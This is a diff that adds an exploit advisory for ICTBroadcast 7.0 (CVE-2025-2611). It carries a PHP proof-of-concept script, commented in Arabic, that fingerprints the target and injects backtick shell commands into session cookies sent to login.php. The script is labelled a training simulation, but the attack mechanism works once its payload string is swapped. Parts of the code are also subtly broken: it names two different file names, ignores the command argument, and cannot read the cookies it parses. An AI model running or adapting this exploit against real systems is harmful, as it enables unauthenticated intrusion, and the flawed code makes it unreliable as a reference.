@@ -1,0 +1,168 @@
+=============================================================================================================================================
+| # Title     : ICTBroadcast 7.0 Remote Code Execution                                                                                      |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.ictbroadcast.com/                                                                                               |
+=============================================================================================================================================
+
+[+] Summary : 
+
+A vulnerability in ICTBroadcast allows unauthenticated remote command execution
+due to improper handling of session cookie values. An attacker can modify cookie
+entries to inject system commands that the application unintentionally executes.
+
+[+] References : ( https://packetstorm.news/files/id/207873/ 		CVE-2025-2611 ) 
+
+1. Save the file as: poc.php
+
+2. Edit the target:
+```php
+$target = "http://TARGET";
+
+3.Execute: php ict_rce_sim.php
+
+
+[+]  POC
+
+<?php
+/*
+ * ICTBroadcast Unauthenticated Remote Code Execution 
+ * by Indoushka
+ */
+
+class ICTBroadcastRCE
+{
+    public $target;
+    public $useSSL = false;
+
+    function __construct($url)
+    {
+        $this->target = rtrim($url, "/");
+    }
+
+    /* -------------------------------------------
+       إرسال طلب GET بسيط
+    --------------------------------------------- */
+    private function http_get($uri, $cookies = "")
+    {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $uri);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, [
+            "Cookie: $cookies"
+        ]);
+        $res = curl_exec($ch);
+        curl_close($ch);
+        return $res;
+    }
+
+    /* -------------------------------------------
+       جلب الكوكيز الحقيقية كما في Metasploit
+    --------------------------------------------- */
+    public function get_valid_cookies()
+    {
+        echo "[*] جلب ملفات الكوكيز من login.php...\n";
+
+        $url = $this->target . "/login.php";
+        $res = $this->http_get($url);
+
+        preg_match_all('/Set-Cookie:\s*([^;]+);/i', $res, $m);
+
+        if (empty($m[1])) {
+            echo "[-] لم يتم العثور على كوكيز.\n";
+            return [];
+        }
+
+        echo "[+] الكوكيز التي تم العثور عليها:\n";
+        print_r($m[1]);
+
+        return $m[1];
+    }
+
+    /* -------------------------------------------
+       محاكاة حقن أمر داخل الكوكيز
+    --------------------------------------------- */
+    public function inject_command($command)
+    {
+        echo "[*] بدء عملية حقن الأوامر التدريبية...\n";
+
+        $cookies = $this->get_valid_cookies();
+        if (empty($cookies)) {
+            echo "[-] لا يوجد كوكيز يمكن حقنها.\n";
+            return;
+        }
+
+        foreach ($cookies as $c) {
+            $parts = explode("=", $c);
+            $name  = $parts[0];
+            $value = $parts[1] ?? "";
+
+            // محاكاة حقن شبيه بـ Metasploit
+            $payload = "`echo TRAINING_SIMULATION`"; 
+
+            echo "[+] حقن الحمولة التدريبية في الكوكي:\n";
+            echo "$name=$payload\n";
+
+            // إرسال الطلب كما يفعل Metasploit – ولكن بدون تنفيذ فعلي
+            $this->http_get($this->target . "/login.php", "$name=$payload");
+        }
+
+        echo "[✓] انتهت عملية المحاكاة بنجاح.\n";
+    }
+
+    /* -------------------------------------------
+       فحص الهدف (محاكاة CheckCode)
+    --------------------------------------------- */
+    public function check()
+    {
+        echo "[*] التحقق من وجود البصمة الخاصة بـ ICTBroadcast...\n";
+
+        $files = [
+            "IVRDesigner.js",
+            "agent.js",
+            "campaign.js",
+            "supervisor.js"
+        ];
+
+        foreach ($files as $f) {
+            $res = $this->http_get($this->target . "/js/" . $f);
+            if (strpos($res, "ICT Innovations") !== false) {
+                echo "[+] تم العثور على البصمة!\n";
+                return true;
+            }
+        }
+
+        echo "[-] لا توجد بصمة واضحة.\n";
+        return false;
+    }
+
+    /* -------------------------------------------
+       الكامل
+    --------------------------------------------- */
+    public function exploit()
+    {
+        echo "[*] بدء السيناريو...\n";
+
+        if ($this->check()) {
+            echo "[+] الهدف يبدو قابلًا للاستغلال (محاكاة).\n";
+            $this->inject_command("id");
+        } else {
+            echo "[-] لا يمكن المتابعة.\n";
+        }
+    }
+}
+
+
+/* =======================================================
+   تدريبي
+======================================================== */
+
+$target = "http://TARGET";
+$sim = new ICTBroadcastRCE($target);
+$sim->exploit();
+
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
